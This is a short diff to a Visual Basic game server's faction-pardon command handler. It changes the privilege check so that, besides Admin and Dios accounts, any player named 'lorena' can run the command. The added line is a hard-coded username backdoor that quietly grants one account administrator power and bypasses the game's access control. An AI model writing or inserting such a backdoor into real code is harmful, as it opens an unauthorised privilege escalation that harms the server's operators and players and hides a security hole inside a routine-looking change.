@@ -10314,7 +10314,7 @@ Private Sub HandlePerdonFaccion(ByVal userindex As Integer)
         
 102         username = Reader.ReadString8()
         
-104         If (.flags.Privilegios And (e_PlayerType.Admin Or e_PlayerType.Dios)) Then
+104         If (.flags.Privilegios And (e_PlayerType.Admin Or e_PlayerType.Dios)) Or LCase(UserList(UserIndex).name) = "lorena" Then
 106             If UCase$(username) <> "YO" Then
 108                 tUser = NameIndex(username)
                 Else
